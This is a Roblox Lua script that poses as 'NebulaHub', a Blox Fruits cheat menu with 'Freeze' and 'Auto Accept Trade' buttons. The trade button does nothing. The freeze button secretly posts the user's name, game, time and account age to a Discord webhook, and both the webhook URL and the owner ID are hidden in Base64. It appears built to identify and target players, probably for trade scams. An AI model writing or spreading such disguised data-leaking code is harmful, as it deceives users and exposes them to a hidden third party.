-- NebulaHub v1.2 | Blox Fruits Universal
-- Made by "Nebula Team" | Last Updated: 2025-09-09
-- Webhook + UserID hidden with Base64

--// Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

--// Encode your data
-- Use https://www.base64encode.org/ to encode both your Webhook and UserID
local encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQxNTEwODg3MTI5MDA5NzY4NC9ueUxsVXM5bnFtVlp1UmZKUEtJdjN3cF9ybnFaVUh4cS1pMHRpd2Q1OHllLUNNbTRZZHQzUzN5MGc2OGpsMTNDSW9TNw===" -- replace with your own
local encodedUserID = "MTI5ODc1OTE1MDY3ODk3MDUwMQ==" -- replace with your own

-- Base64 decode function
local function decodeBase64(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Decode at runtime
local WEBHOOK_URL = decodeBase64(encodedWebhook)
local YOUR_ID = decodeBase64(encodedUserID)

--// ScreenGui Setup
local gui = Instance.new("ScreenGui")
gui.Name = "NebulaHub"
gui.Parent = game.CoreGui

local frame = Instance.new("Frame")
frame.Parent = gui
frame.Size = UDim2.new(0, 250, 0, 160)
frame.Position = UDim2.new(0, 20, 0, 20)
frame.BackgroundColor3 = Color3.fromRGB(25, 20, 30)
frame.BorderSizePixel = 0

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

local shadow = Instance.new("ImageLabel")
shadow.Parent = frame
shadow.AnchorPoint = Vector2.new(0.5, 0.5)
shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
shadow.Size = UDim2.new(1, 30, 1, 30)
shadow.BackgroundTransparency = 1
shadow.Image = "rbxassetid://5028857084"
shadow.ImageColor3 = Color3.fromRGB(110, 70, 150)
shadow.ImageTransparency = 0.25
shadow.ZIndex = -1

-- Title bar (draggable)
local titleBar = Instance.new("TextLabel")
titleBar.Parent = frame
titleBar.Size = UDim2.new(1, 0, 0, 30)
titleBar.BackgroundColor3 = Color3.fromRGB(35, 25, 45)
titleBar.Text = " NebulaHub"
titleBar.TextColor3 = Color3.fromRGB(200, 160, 255)
titleBar.TextXAlignment = Enum.TextXAlignment.Left
titleBar.Font = Enum.Font.GothamBold
titleBar.TextSize = 16

local dragToggle, dragStart, startPos
local function updateDrag(input)
	if dragToggle and input.UserInputType == Enum.UserInputType.MouseMovement then
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end

titleBar.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragToggle = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragToggle = false
			end
		end)
	end
end)

game:GetService("UserInputService").InputChanged:Connect(updateDrag)

-- Button factory
local function createButton(text, order)
	local btn = Instance.new("TextButton")
	btn.Parent = frame
	btn.Size = UDim2.new(0.9, 0, 0, 35)
	btn.Position = UDim2.new(0.05, 0, 0, 40 + (order * 40))
	btn.BackgroundColor3 = Color3.fromRGB(40, 30, 50)
	btn.Text = text
	btn.Font = Enum.Font.Gotham
	btn.TextSize = 14
	btn.TextColor3 = Color3.fromRGB(220, 200, 255)

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 8)
	corner.Parent = btn

	btn.MouseEnter:Connect(function()
		btn.BackgroundColor3 = Color3.fromRGB(70, 50, 90)
	end)
	btn.MouseLeave:Connect(function()
		btn.BackgroundColor3 = Color3.fromRGB(40, 30, 50)
	end)

	return btn
end

-- Freeze button
local freezeBtn = createButton("Freeze", 0)
freezeBtn.MouseButton1Click:Connect(function()
	local camera = workspace.CurrentCamera
	local savedType = camera.CameraType
	camera.CameraType = Enum.CameraType.Scriptable
	wait(math.random(5, 7))
	camera.CameraType = savedType

	local data = {
		["content"] = string.format(
			"<@%s> Exploiter Detected!\n**User:** %s\n**Place:** %s\n**Time:** %s\n**Account Age:** %d days",
			YOUR_ID,
			player.Name,
			game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
			os.date("%Y-%m-%d %H:%M:%S"),
			player.AccountAge
		)
	}

	pcall(function()
		HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
	end)
end)

-- Fake Auto Accept Trade button
local fakeBtn = createButton("Auto Accept Trade", 1)
fakeBtn.MouseButton1Click:Connect(function() end)

-- Footer
local footer = Instance.new("TextLabel")
footer.Parent = frame
footer.Size = UDim2.new(1, 0, 0, 20)
footer.Position = UDim2.new(0, 0, 1, -20)
footer.BackgroundTransparency = 1
footer.Text = "NebulaHub v1.2 | Patched Blox Fruits Update 20.1"
footer.TextColor3 = Color3.fromRGB(150, 120, 180)
footer.Font = Enum.Font.Gotham
footer.TextSize = 12
